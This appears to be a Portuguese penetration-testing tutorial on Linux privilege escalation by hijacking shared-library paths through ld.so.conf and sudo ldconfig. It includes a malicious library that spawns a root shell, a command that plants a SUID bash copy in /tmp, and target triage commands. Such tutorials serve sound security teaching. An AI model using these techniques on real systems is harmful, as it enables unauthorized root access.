# Exemplo de exploit de privesc do ld.so

{{#include ../../banners/hacktricks-training.md}}

## Preparar o ambiente

Na seção a seguir, você pode encontrar o código dos arquivos que usaremos para preparar o ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crie** esses arquivos na sua máquina, na mesma pasta
2. **Compile** a **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copie** `libcustom.so` para `/usr/lib` e atualize o cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilégios de root)
4. **Compile** o **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Verifique o ambiente

Verifique se _libcustom.so_ está sendo **carregado** de _/usr/lib_ e se você consegue **executar** o binário.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos úteis de triagem

Ao atacar um alvo real, verifique o **nome exato da biblioteca** de que o binário precisa e o que o loader está **resolvendo atualmente**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Alguns detalhes úteis:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` geralmente **não funciona** porque
o redirecionamento é feito pelo seu shell atual. Em vez disso, use
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Binários **SUID/privileged** ignoram `LD_LIBRARY_PATH`/`LD_PRELOAD` no
**secure-execution mode**, mas os diretórios provenientes de `/etc/ld.so.conf` ainda
fazem parte da configuração confiável do loader, portanto essa
misconfiguration ainda pode afetar programas privilegiados.<sup>[[1]](#references)</sup>
- Em versões mais recentes do glibc, o dynamic loader também disponibiliza
`--list-diagnostics`, que é útil para depurar a resolução do cache e a seleção de
subdiretórios `glibc-hwcaps` quando um hijack não se comporta como esperado.<sup>[[1]](#references)</sup>

## Exploit

Neste cenário, vamos supor que **alguém criou uma entrada vulnerável** dentro de um arquivo em _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
A pasta vulnerável é _/home/ubuntu/lib_ (onde temos acesso de escrita).\
**Baixe e compile** o código a seguir dentro desse caminho:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se você espera que **root** (ou outra conta privilegiada) execute o binário vulnerável posteriormente, geralmente é melhor deixar um **artefato pertencente ao root** em vez de iniciar um shell interativo. Por exemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Então, após a execução privilegiada acontecer, você pode usar `/tmp/rootbash -p`.

Agora que **criamos a biblioteca libcustom maliciosa dentro do caminho mal configurado**, precisamos aguardar uma **reinicialização** ou que o usuário root execute **`ldconfig`** (_caso você possa executar esse binário como **sudo** ou ele tenha o **suid bit**, poderá executá-lo você mesmo_).

Depois que isso acontecer, **verifique novamente** de onde o executável `sharedvuln` está carregando a biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como você pode ver, ele está **sendo carregado de `/home/ubuntu/lib`** e, se qualquer usuário o executar, um shell será executado:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Observe que, neste exemplo, não escalamos privilégios, mas, modificando os comandos executados e **aguardando que o root ou outro usuário privilegiado execute o binário vulnerável**, conseguiremos escalar privilégios.

### Outras configurações incorretas - Mesma vuln

No exemplo anterior, simulamos uma configuração incorreta em que um administrador **configurou uma pasta não privilegiada dentro de um arquivo de configuração em `/etc/ld.so.conf.d/`**.\
Mas existem outras configurações incorretas que podem causar a mesma vulnerabilidade: se você tiver **permissões de escrita** em algum **arquivo de configuração** dentro de `/etc/ld.so.conf.d`, na pasta `/etc/ld.so.conf.d` ou no arquivo `/etc/ld.so.conf`, poderá configurar a mesma vulnerabilidade e explorá-la.

## Exploit 2

**Suponha que você tenha privilégios sudo sobre `ldconfig`**.\
Você pode indicar ao `ldconfig` **de onde carregar os arquivos conf**, então podemos aproveitar isso para fazer o `ldconfig` carregar pastas arbitrárias.<sup>[[2]](#references)</sup>\
Então, vamos criar os arquivos e as pastas necessários para carregar "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Agora, conforme indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
E, finalmente, vamos carregar o path e verificar de onde o binário está carregando a biblioteca:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como você pode ver, tendo privilégios sudo sobre `ldconfig`, é possível explorar a mesma vulnerabilidade.**

## Referências

- [1] [ld.so(8) - página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - página de manual do Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)

{{#include ../../banners/hacktricks-training.md}}
